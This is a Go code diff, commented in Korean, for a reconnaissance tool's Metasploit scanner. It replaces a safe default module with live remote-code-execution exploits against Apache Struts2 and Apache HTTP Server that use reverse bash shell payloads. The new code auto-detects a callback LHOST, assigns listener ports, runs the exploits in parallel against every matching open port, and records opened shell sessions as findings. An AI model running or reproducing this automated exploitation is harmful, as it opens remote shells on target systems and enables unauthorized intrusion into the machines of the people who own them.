@@ -5,37 +5,68 @@ import (
 	"bytes"
 	"context"
 	"io"
+	"net"
 	"os/exec"
+	"strconv"
 	"strings"
+	"sync"
 
 	"github.com/rikychoi/recon/internal/model"
 )
 
 // MSFModule은 실행할 Metasploit 모듈과 그에 연관된 취약점 메타데이터를 정의한다.
 type MSFModule struct {
-	Name     string  // 모듈 경로 (예: auxiliary/scanner/http/http_version)
+	Name     string  // 모듈 경로 (예: exploit/multi/http/struts2_content_type_ognl)
 	CVE      string  // 연관 CVE 식별자 (있으면)
 	CVSS     float64 // 연관 CVSS 점수 (알 수 없으면 0)
 	Severity string  // 심각도 등급 (비면 CVSS로부터 추론)
+	Port     int     // 대상 서비스 기본 포트(포트 정보가 없을 때 RPORT로 사용, 0이면 미설정)
+	Payload  string  // 페이로드 모듈명(비면 모듈 기본 페이로드 사용, exploit 모듈에만 의미)
+	Service  string  // 적합 서비스 키워드(예: "http"). 이 키워드를 포함하는 서비스 포트에만 실행. 비면 모든 포트.
 }
 
-// DefaultMSFModules는 기본으로 실행할 안전한 정보 수집용 모듈 집합이다.
-// 실제 취약점 검증 모듈은 대상 특성에 맞게 호출 측에서 추가한다.
+// DefaultMSFModules는 기본으로 실행할 실 CVE 점검 모듈 집합이다.
+// 각 모듈은 대상에 대해 실제로 실행(run)되며, 긍정 결과([+]/세션)를 해당 CVE 취약점으로 기록한다.
+// 대상 특성에 맞는 추가 모듈은 호출 측에서 등록할 수 있다.
 var DefaultMSFModules = []MSFModule{
-	{Name: "auxiliary/scanner/http/http_version", CVSS: 0},
+	{Name: "exploit/multi/http/struts2_content_type_ognl", CVE: "CVE-2017-5638", CVSS: 9.8, Port: 8080, Payload: "cmd/unix/reverse_bash", Service: "http"},
+	{Name: "exploit/multi/http/apache_normalize_path_rce", CVE: "CVE-2021-41773", CVSS: 7.5, Port: 80, Payload: "cmd/unix/reverse_bash", Service: "http"},
+	{Name: "auxiliary/scanner/http/log4shell_scanner", CVE: "CVE-2021-44228", CVSS: 10.0, Port: 8080, Service: "http"},
 }
+
+const (
+	defaultMSFBaseLPort   = 4444 // exploit 모듈 콜백 LPORT 시작값(모듈마다 +1씩 부여)
+	defaultMSFConcurrency = 4    // 모듈 병렬 실행 상한(동시 msfconsole 프로세스 수)
+)
 
 // MetasploitScanner는 msfconsole을 실행하여 취약점을 점검하는 VulnerabilityScanner 구현이다.
-// 각 모듈을 개별 msfconsole 세션으로 실행하여 결과 귀속을 단순화한다.
+// 각 모듈을 개별 msfconsole 세션으로 병렬 실행하며, exploit 모듈에는 LHOST와 고유 LPORT를 부여한다.
 type MetasploitScanner struct {
-	binary   string      // msfconsole 경로 (기본 "msfconsole")
-	modules  []MSFModule // 실행할 모듈 목록
-	progress io.Writer   // 진행 상황 출력 대상(nil이면 미출력)
+	binary      string      // msfconsole 경로 (기본 "msfconsole")
+	modules     []MSFModule // 실행할 모듈 목록
+	lhosts      []string    // 리버스 콜백을 받을 LHOST 후보(비면 로컬 IP 자동 감지)
+	baseLPort   int         // LPORT 시작값
+	concurrency int         // 모듈 동시 실행 상한
+	progress    io.Writer   // 진행 상황 출력 대상(nil이면 미출력)
+	progressMu  sync.Mutex  // 병렬 실행 시 진행 로그 출력을 직렬화
 }
 
 // SetProgress는 모듈별 진행 상황을 출력할 Writer를 지정한다(nil이면 미출력).
 func (m *MetasploitScanner) SetProgress(w io.Writer) {
 	m.progress = w
+}
+
+// SetLHosts는 리버스 콜백을 받을 LHOST 후보 목록을 지정한다(예: 사설 IP, 공인 IP).
+// 지정하지 않으면 Scan 시 로컬(사설) IP를 자동 감지한다.
+func (m *MetasploitScanner) SetLHosts(lhosts ...string) {
+	m.lhosts = lhosts
+}
+
+// SetConcurrency는 모듈을 동시에 실행할 최대 개수를 지정한다(0 이하이면 무시).
+func (m *MetasploitScanner) SetConcurrency(n int) {
+	if n > 0 {
+		m.concurrency = n
+	}
 }
 
 // NewMetasploitScanner는 MetasploitScanner를 생성한다.
@@ -47,36 +78,206 @@ func NewMetasploitScanner(binary string, modules ...MSFModule) *MetasploitScanne
 	if len(modules) == 0 {
 		modules = DefaultMSFModules
 	}
-	return &MetasploitScanner{binary: binary, modules: modules}
+	return &MetasploitScanner{
+		binary:      binary,
+		modules:     modules,
+		baseLPort:   defaultMSFBaseLPort,
+		concurrency: defaultMSFConcurrency,
+	}
 }
 
-// buildResourceScript는 지정한 모듈을 대상(rhosts)에 대해 실행하는 msfconsole 리소스 명령을 만든다.
-func buildResourceScript(module, rhosts string) string {
-	return "use " + module + "; set RHOSTS " + rhosts + "; run; exit"
+// logf는 병렬 실행 중 진행 로그가 뒤섞이지 않도록 출력을 직렬화한다.
+func (m *MetasploitScanner) logf(format string, a ...any) {
+	m.progressMu.Lock()
+	defer m.progressMu.Unlock()
+	progressf(m.progress, format, a...)
 }
 
-// Scan은 설정된 각 모듈을 대상 목록에 대해 실행하고 긍정 결과([+])를 취약점으로 수집한다.
-func (m *MetasploitScanner) Scan(ctx context.Context, targets []string) ([]model.Vulnerability, error) {
+// msfRun은 하나의 msfconsole 실행에 필요한 설정을 담는다.
+// 값이 비어 있는(0인) 항목은 리소스 스크립트에서 설정을 생략하여 모듈 기본값을 따른다.
+type msfRun struct {
+	mod    MSFModule // 결과 귀속을 위한 모듈 메타데이터
+	rhosts string    // 대상 호스트(공백 구분)
+	rport  string    // 대상 포트(비면 모듈 기본값)
+	lhost  string    // 리버스 콜백을 받을 공격자 IP(비면 미설정)
+	lport  int       // 콜백 포트(0이면 미설정)
+	total  int       // 진행 표시용 전체 작업 수
+	index  int       // 진행 표시용 현재 작업 번호(0-based)
+}
+
+// buildResourceScript는 msfRun 설정으로 msfconsole 리소스 명령을 만든다.
+func buildResourceScript(r msfRun) string {
+	s := "use " + r.mod.Name + "; set RHOSTS " + r.rhosts
+	if r.rport != "" {
+		s += "; set RPORT " + r.rport
+	}
+	if r.mod.Payload != "" {
+		s += "; set PAYLOAD " + r.mod.Payload
+	}
+	if r.lhost != "" {
+		s += "; set LHOST " + r.lhost
+	}
+	if r.lport > 0 {
+		s += "; set LPORT " + strconv.Itoa(r.lport)
+	}
+	return s + "; run; exit"
+}
+
+// isExploitModule은 리버스/바인드 페이로드가 필요한 exploit 계열 모듈인지 판정한다.
+func isExploitModule(name string) bool {
+	return strings.HasPrefix(name, "exploit/")
+}
+
+// moduleMatchesService는 모듈이 해당 포트의 서비스에 적합한지 판정한다.
+// 모듈 Service가 비면 모든 서비스에 적합(true)하고, 값이 있으면 포트 서비스명에
+// 그 키워드가 포함될 때만 적합하다. 예: Service "http"는 http/https/http-proxy 등과 일치한다.
+func moduleMatchesService(mod MSFModule, service string) bool {
+	if mod.Service == "" {
+		return true
+	}
+	return strings.Contains(strings.ToLower(service), strings.ToLower(mod.Service))
+}
+
+// localOutboundIP는 외부로 나가는 경로의 로컬 IP(사설 IP 등)를 반환한다.
+// 실제 패킷을 전송하지 않고 라우팅상 로컬 주소만 얻는다. 실패 시 빈 문자열을 반환한다.
+func localOutboundIP() string {
+	c, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		return ""
+	}
+	defer c.Close()
+	if addr, ok := c.LocalAddr().(*net.UDPAddr); ok {
+		return addr.IP.String()
+	}
+	return ""
+}
+
+// portGroup은 같은 포트·서비스를 가진 대상 호스트 묶음이다.
+type portGroup struct {
+	port    int      // 포트 번호(0이면 포트 정보 없음)
+	service string   // 포트의 서비스명(예: http, ssh)
+	hosts   []string // 이 포트가 열린 호스트 목록
+}
+
+// Scan은 설정된 각 모듈을 적합한 서비스 포트에 대해서만 실제로 실행(run)하고
+// 긍정 결과를 CVE 취약점으로 수집한다. targets는 포트스캔이 식별한 열린 포트(서비스 포함)이며,
+// 각 모듈은 Service 키워드가 일치하는 포트에만 실행된다(예: http 모듈은 http 계열 포트에만).
+// 모듈 실행은 고루틴으로 병렬 처리하며(concurrency로 상한), exploit 모듈에는
+// LHOST(자동 감지 또는 지정)와 모듈별 고유 LPORT를 부여해 리버스 콜백 충돌을 막는다.
+func (m *MetasploitScanner) Scan(ctx context.Context, targets []model.Port) ([]model.Vulnerability, error) {
 	if len(targets) == 0 || len(m.modules) == 0 {
 		return nil, nil
 	}
 
-	rhosts := strings.Join(targets, " ")
-	var vulns []model.Vulnerability
-	for i, mod := range m.modules {
-		progressf(m.progress, "    - [%d/%d] msf %s ...\n", i+1, len(m.modules), mod.Name)
-		script := buildResourceScript(mod.Name, rhosts)
-		cmd := exec.CommandContext(ctx, m.binary, "-q", "-x", script)
-		// msfconsole이 부모 터미널을 raw 모드로 바꿔 입력이 먹통이 되는 것을 막기 위해
-		// 자식 프로세스를 제어 터미널에서 분리한다.
-		cmd.SysProcAttr = detachedProcAttr()
-		out, err := cmd.Output()
-		if err != nil {
-			continue // 개별 모듈 실행 실패는 건너뛰고 다음 모듈을 진행한다.
-		}
-		vulns = append(vulns, parseMSFOutput(bytes.NewReader(out), mod)...)
+	// 동일한 (포트, 서비스)별로 호스트를 그룹화한다. Number 0은 포트 정보가 없는 대상이다.
+	type key struct {
+		port    int
+		service string
 	}
+	grouped := make(map[key]*portGroup)
+	var order []key
+	for _, p := range targets {
+		k := key{port: p.Number, service: p.Service}
+		g, ok := grouped[k]
+		if !ok {
+			g = &portGroup{port: p.Number, service: p.Service}
+			grouped[k] = g
+			order = append(order, k)
+		}
+		g.hosts = append(g.hosts, p.Target)
+	}
+
+	// LHOST 후보: 지정값이 없으면 로컬(사설) IP를 자동 감지한다.
+	lhosts := m.lhosts
+	if len(lhosts) == 0 {
+		if ip := localOutboundIP(); ip != "" {
+			lhosts = []string{ip}
+		}
+	}
+
+	// (모듈 × 적합 포트그룹 × LHOST) 조합으로 실행 작업을 만든다.
+	// exploit 모듈은 LHOST 후보마다 고유 LPORT를 부여해 핸들러 포트 충돌을 막는다.
+	var runs []msfRun
+	lport := m.baseLPort
+	addGroup := func(mod MSFModule, hosts []string, rport string) {
+		rhosts := strings.Join(hosts, " ")
+		if !isExploitModule(mod.Name) {
+			runs = append(runs, msfRun{mod: mod, rhosts: rhosts, rport: rport})
+			return
+		}
+		cands := lhosts
+		if len(cands) == 0 {
+			cands = []string{""} // LHOST 자동 감지 실패 시에도 모듈 기본값으로 1회 실행
+		}
+		for _, lh := range cands {
+			runs = append(runs, msfRun{mod: mod, rhosts: rhosts, rport: rport, lhost: lh, lport: lport})
+			lport++
+		}
+	}
+	for _, mod := range m.modules {
+		for _, k := range order {
+			g := grouped[k]
+			if g.port == 0 {
+				// 포트 정보가 없는 대상은 모듈 기본 포트로 실행한다(서비스 필터 불가).
+				defPort := ""
+				if mod.Port > 0 {
+					defPort = strconv.Itoa(mod.Port)
+				}
+				addGroup(mod, g.hosts, defPort)
+				continue
+			}
+			if !moduleMatchesService(mod, g.service) {
+				continue // 모듈이 적합하지 않은 서비스 포트는 건너뛴다(예: http 모듈 vs smb 포트).
+			}
+			addGroup(mod, g.hosts, strconv.Itoa(g.port))
+		}
+	}
+
+	// 작업을 고루틴 워커 풀로 병렬 실행하고 결과를 취합한다.
+	var (
+		mu    sync.Mutex
+		vulns []model.Vulnerability
+		wg    sync.WaitGroup
+	)
+	sem := make(chan struct{}, m.concurrency)
+	for i := range runs {
+		run := runs[i]
+		run.index, run.total = i, len(runs)
+		wg.Add(1)
+		go func(run msfRun) {
+			defer wg.Done()
+			select {
+			case sem <- struct{}{}:
+				defer func() { <-sem }()
+			case <-ctx.Done():
+				return
+			}
+			if v := m.runTask(ctx, run); len(v) > 0 {
+				mu.Lock()
+				vulns = append(vulns, v...)
+				mu.Unlock()
+			}
+		}(run)
+	}
+	wg.Wait()
 	return vulns, nil
+}
+
+// runTask는 단일 msfconsole 실행을 수행하고 출력을 해당 모듈 메타데이터로 파싱한다.
+// 개별 실행 실패(모듈 부재/네트워크 오류 등)는 nil을 반환하고 전체 점검은 계속된다.
+func (m *MetasploitScanner) runTask(ctx context.Context, run msfRun) []model.Vulnerability {
+	m.logf("    - [%d/%d] msf %s (CVE=%s RPORT=%s LPORT=%d) ...\n",
+		run.index+1, run.total, run.mod.Name, run.mod.CVE, run.rport, run.lport)
+	script := buildResourceScript(run)
+	cmd := exec.CommandContext(ctx, m.binary, "-q", "-x", script)
+	// msfconsole이 부모 터미널을 raw 모드로 바꿔 입력이 먹통이 되는 것을 막기 위해
+	// 자식 프로세스를 제어 터미널에서 분리한다.
+	cmd.SysProcAttr = detachedProcAttr()
+	out, err := cmd.Output()
+	if err != nil {
+		return nil
+	}
+	return parseMSFOutput(bytes.NewReader(out), run.mod)
 }
 
 // parseMSFOutput은 msfconsole 출력에서 [+] 긍정 결과 줄을 취약점으로 변환한다.
@@ -87,8 +288,10 @@ func parseMSFOutput(r io.Reader, mod MSFModule) []model.Vulnerability {
 	sc.Buffer(make([]byte, 0, 64*1024), 1024*1024)
 	for sc.Scan() {
 		line := strings.TrimSpace(sc.Text())
-		if !strings.HasPrefix(line, "[+]") {
-			continue // 긍정 결과([+]) 줄만 취약점으로 취급한다.
+		// 취약 판정: [+] 긍정 결과 줄, 또는 익스플로잇 성공으로 세션이 열린 줄.
+		positive := strings.HasPrefix(line, "[+]") || isSessionOpened(line)
+		if !positive {
+			continue
 		}
 		msg := strings.TrimSpace(strings.TrimPrefix(line, "[+]"))
 
@@ -110,6 +313,13 @@ func parseMSFOutput(r io.Reader, mod MSFModule) []model.Vulnerability {
 		})
 	}
 	return vulns
+}
+
+// isSessionOpened는 익스플로잇 성공으로 세션이 열린 msfconsole 로그 줄인지 판정한다.
+// 예: "[*] Command shell session 1 opened (...)", "Meterpreter session 2 opened".
+func isSessionOpened(line string) bool {
+	l := strings.ToLower(line)
+	return strings.Contains(l, "session") && strings.Contains(l, "opened")
 }
 
 // extractMSFTarget은 msfconsole 결과 줄에서 대상 host:port를 추출한다.
